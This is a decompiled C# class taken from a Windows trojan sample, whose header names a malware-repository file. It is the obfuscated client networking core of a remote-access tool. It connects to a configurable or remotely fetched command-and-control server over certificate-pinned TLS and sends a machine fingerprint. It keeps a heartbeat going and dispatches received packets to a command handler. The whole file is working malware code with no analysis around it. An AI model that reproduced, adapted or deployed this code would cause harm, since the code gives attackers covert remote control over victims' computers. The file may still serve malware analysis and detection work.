// Decompiled with JetBrains decompiler
// Type: BKkyzJKHJApZN.yABknUITdI
// Assembly: deinvater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89B491E0-9EDA-4D26-ADB9-208707ED33ED
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-561b48f813af5f638c5f305d21a716998cce9e0ce1ea3374fd118cec5f725885.exe

using JYUfEoWFNtx;
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using wzcmoCobVvfl;
using xjXkkjtlfmw;
using zOUYjcXSyH;

namespace BKkyzJKHJApZN
{
  public static class yABknUITdI
  {
    public static Socket ZojEZyXrCulLtIU { get; set; }

    public static SslStream VDFtWgxbRhuwsQL { get; set; }

    private static byte[] CMtiXycNTD { get; set; }

    private static long kstWIZXuXYJF { get; set; }

    private static long UfVunJZejTIAef { get; set; }

    private static System.Threading.Timer ONfWAqcGOzJi { get; set; }

    public static bool xLdNZUEWkWmtE { get; set; }

    private static object ZKJvkZmGYbcwXY { get; } = new object();

    private static System.Threading.Timer eZExIrFLoEPH { get; set; }

    public static int gEfoADTVWjqO { get; set; }

    public static bool DrnuTrOUNCntl { get; set; }

    public static void ygufafbWAGhZbBQ()
    {
      try
      {
        yABknUITdI.ZojEZyXrCulLtIU = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
          ReceiveBufferSize = 51200,
          SendBufferSize = 51200
        };
        if (FBcKnoLoUsnvl.RThUPrxUkWckns == "null")
        {
          string str = FBcKnoLoUsnvl.ZvtXpGbTvM.Split(',')[new Random().Next(FBcKnoLoUsnvl.ZvtXpGbTvM.Split(',').Length)];
          int int32 = Convert.ToInt32(FBcKnoLoUsnvl.NNZMBTvAsgUZ.Split(',')[new Random().Next(FBcKnoLoUsnvl.NNZMBTvAsgUZ.Split(',').Length)]);
          if (yABknUITdI.XeyCbpGxzhIDGR(str))
          {
            foreach (IPAddress hostAddress in Dns.GetHostAddresses(str))
            {
              try
              {
                yABknUITdI.ZojEZyXrCulLtIU.Connect(hostAddress, int32);
                if (yABknUITdI.ZojEZyXrCulLtIU.Connected)
                  break;
              }
              catch
              {
              }
            }
          }
          else
            yABknUITdI.ZojEZyXrCulLtIU.Connect(str, int32);
        }
        else
        {
          using (WebClient webClient = new WebClient())
          {
            NetworkCredential networkCredential = new NetworkCredential("", "");
            webClient.Credentials = (ICredentials) networkCredential;
            string[] strArray = webClient.DownloadString(FBcKnoLoUsnvl.RThUPrxUkWckns).Split(new string[1]
            {
              ":"
            }, StringSplitOptions.None);
            FBcKnoLoUsnvl.ZvtXpGbTvM = strArray[0];
            FBcKnoLoUsnvl.NNZMBTvAsgUZ = strArray[new Random().Next(1, strArray.Length)];
            yABknUITdI.ZojEZyXrCulLtIU.Connect(FBcKnoLoUsnvl.ZvtXpGbTvM, Convert.ToInt32(FBcKnoLoUsnvl.NNZMBTvAsgUZ));
          }
        }
        if (yABknUITdI.ZojEZyXrCulLtIU.Connected)
        {
          yABknUITdI.xLdNZUEWkWmtE = true;
          yABknUITdI.VDFtWgxbRhuwsQL = new SslStream((Stream) new NetworkStream(yABknUITdI.ZojEZyXrCulLtIU, true), false, new RemoteCertificateValidationCallback(yABknUITdI.TaAuqcpKDtJqVYY));
          yABknUITdI.VDFtWgxbRhuwsQL.AuthenticateAsClient(yABknUITdI.ZojEZyXrCulLtIU.RemoteEndPoint.ToString().Split(':')[0], (X509CertificateCollection) null, SslProtocols.Tls, false);
          yABknUITdI.kstWIZXuXYJF = 4L;
          yABknUITdI.CMtiXycNTD = new byte[yABknUITdI.kstWIZXuXYJF];
          yABknUITdI.UfVunJZejTIAef = 0L;
          yABknUITdI.MjCfIOzZokpvUuE(gOfFridrQyAVTl.RQZErqByRKuJ());
          yABknUITdI.gEfoADTVWjqO = 0;
          yABknUITdI.DrnuTrOUNCntl = false;
          yABknUITdI.ONfWAqcGOzJi = new System.Threading.Timer(new TimerCallback(yABknUITdI.YxYMoZBxyVi), (object) null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
          yABknUITdI.eZExIrFLoEPH = new System.Threading.Timer(new TimerCallback(yABknUITdI.mTrLgvmMbduoKu), (object) null, 1, 1);
          yABknUITdI.VDFtWgxbRhuwsQL.BeginRead(yABknUITdI.CMtiXycNTD, (int) yABknUITdI.UfVunJZejTIAef, (int) yABknUITdI.kstWIZXuXYJF, new AsyncCallback(yABknUITdI.GRwqOfBrwXI), (object) null);
        }
        else
          yABknUITdI.xLdNZUEWkWmtE = false;
      }
      catch
      {
        yABknUITdI.xLdNZUEWkWmtE = false;
      }
    }

    private static bool XeyCbpGxzhIDGR(string tzmQNPHVPf) => Uri.CheckHostName(tzmQNPHVPf) != 0;

    private static bool TaAuqcpKDtJqVYY(
      object hxxjxrfiBhH,
      X509Certificate BaIzDkvXIQmvlsA,
      X509Chain wejYVreoKOWQab,
      SslPolicyErrors UYDqkfDOxLtT)
    {
      return FBcKnoLoUsnvl.hZZKnAetVvUUDO.Equals(BaIzDkvXIQmvlsA);
    }

    public static void IYdDJhCYkmYSglws()
    {
      try
      {
        yABknUITdI.VDFtWgxbRhuwsQL?.Dispose();
        yABknUITdI.ZojEZyXrCulLtIU?.Dispose();
        yABknUITdI.eZExIrFLoEPH?.Dispose();
        yABknUITdI.ONfWAqcGOzJi?.Dispose();
      }
      catch
      {
      }
      yABknUITdI.xLdNZUEWkWmtE = false;
    }

    public static void GRwqOfBrwXI(IAsyncResult qtaltXaFcZZmk)
    {
      try
      {
        if (!yABknUITdI.ZojEZyXrCulLtIU.Connected || !yABknUITdI.xLdNZUEWkWmtE)
        {
          yABknUITdI.xLdNZUEWkWmtE = false;
        }
        else
        {
          int num1 = yABknUITdI.VDFtWgxbRhuwsQL.EndRead(qtaltXaFcZZmk);
          if (num1 > 0)
          {
            yABknUITdI.UfVunJZejTIAef += (long) num1;
            yABknUITdI.kstWIZXuXYJF -= (long) num1;
            if (yABknUITdI.kstWIZXuXYJF == 0L)
            {
              yABknUITdI.kstWIZXuXYJF = (long) BitConverter.ToInt32(yABknUITdI.CMtiXycNTD, 0);
              if (yABknUITdI.kstWIZXuXYJF > 0L)
              {
                yABknUITdI.UfVunJZejTIAef = 0L;
                yABknUITdI.CMtiXycNTD = new byte[yABknUITdI.kstWIZXuXYJF];
                while (yABknUITdI.kstWIZXuXYJF > 0L)
                {
                  int num2 = yABknUITdI.VDFtWgxbRhuwsQL.Read(yABknUITdI.CMtiXycNTD, (int) yABknUITdI.UfVunJZejTIAef, (int) yABknUITdI.kstWIZXuXYJF);
                  if (num2 <= 0)
                  {
                    yABknUITdI.xLdNZUEWkWmtE = false;
                    return;
                  }
                  yABknUITdI.UfVunJZejTIAef += (long) num2;
                  yABknUITdI.kstWIZXuXYJF -= (long) num2;
                  if (yABknUITdI.kstWIZXuXYJF < 0L)
                  {
                    yABknUITdI.xLdNZUEWkWmtE = false;
                    return;
                  }
                }
                new Thread(new ParameterizedThreadStart(MvfZagPRHVeGhz.nBqiVRBhulQg)).Start((object) yABknUITdI.CMtiXycNTD);
                yABknUITdI.UfVunJZejTIAef = 0L;
                yABknUITdI.kstWIZXuXYJF = 4L;
                yABknUITdI.CMtiXycNTD = new byte[yABknUITdI.kstWIZXuXYJF];
              }
              else
              {
                yABknUITdI.kstWIZXuXYJF = 4L;
                yABknUITdI.CMtiXycNTD = new byte[yABknUITdI.kstWIZXuXYJF];
                yABknUITdI.UfVunJZejTIAef = 0L;
              }
            }
            else if (yABknUITdI.kstWIZXuXYJF < 0L)
            {
              yABknUITdI.xLdNZUEWkWmtE = false;
              return;
            }
            yABknUITdI.VDFtWgxbRhuwsQL.BeginRead(yABknUITdI.CMtiXycNTD, (int) yABknUITdI.UfVunJZejTIAef, (int) yABknUITdI.kstWIZXuXYJF, new AsyncCallback(yABknUITdI.GRwqOfBrwXI), (object) null);
          }
          else
            yABknUITdI.xLdNZUEWkWmtE = false;
        }
      }
      catch
      {
        yABknUITdI.xLdNZUEWkWmtE = false;
      }
    }

    public static void MjCfIOzZokpvUuE(byte[] tGqocQzPUhdc)
    {
      lock (yABknUITdI.ZKJvkZmGYbcwXY)
      {
        try
        {
          if (!yABknUITdI.xLdNZUEWkWmtE)
            return;
          byte[] bytes = BitConverter.GetBytes(tGqocQzPUhdc.Length);
          yABknUITdI.ZojEZyXrCulLtIU.Poll(-1, SelectMode.SelectWrite);
          yABknUITdI.VDFtWgxbRhuwsQL.Write(bytes, 0, bytes.Length);
          if (tGqocQzPUhdc.Length > 1000000)
          {
            using (MemoryStream memoryStream = new MemoryStream(tGqocQzPUhdc))
            {
              memoryStream.Position = 0L;
              byte[] buffer = new byte[50000];
              int count;
              while ((count = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
              {
                yABknUITdI.ZojEZyXrCulLtIU.Poll(-1, SelectMode.SelectWrite);
                yABknUITdI.VDFtWgxbRhuwsQL.Write(buffer, 0, count);
                yABknUITdI.VDFtWgxbRhuwsQL.Flush();
              }
            }
          }
          else
          {
            yABknUITdI.ZojEZyXrCulLtIU.Poll(-1, SelectMode.SelectWrite);
            yABknUITdI.VDFtWgxbRhuwsQL.Write(tGqocQzPUhdc, 0, tGqocQzPUhdc.Length);
            yABknUITdI.VDFtWgxbRhuwsQL.Flush();
          }
        }
        catch
        {
          yABknUITdI.xLdNZUEWkWmtE = false;
        }
      }
    }

    public static void YxYMoZBxyVi(object VQfWQIVKPFiCuj)
    {
      try
      {
        qndoAMceTifg qndoAmceTifg = new qndoAMceTifg();
        qndoAmceTifg.wepJRVVjtiqCpFB("Packet").qwSOFTUDqXer = "Ping";
        qndoAmceTifg.wepJRVVjtiqCpFB("Message").qwSOFTUDqXer = QBtrXhHIUz.UEUBHUoyiSJnTTl();
        yABknUITdI.MjCfIOzZokpvUuE(qndoAmceTifg.YIFlWiIksqd());
        GC.Collect();
        yABknUITdI.DrnuTrOUNCntl = true;
      }
      catch
      {
      }
    }

    private static void mTrLgvmMbduoKu(object ZUwtLjSGTblv)
    {
      try
      {
        if (!yABknUITdI.DrnuTrOUNCntl || !yABknUITdI.xLdNZUEWkWmtE)
          return;
        ++yABknUITdI.gEfoADTVWjqO;
      }
      catch
      {
      }
    }
  }
}
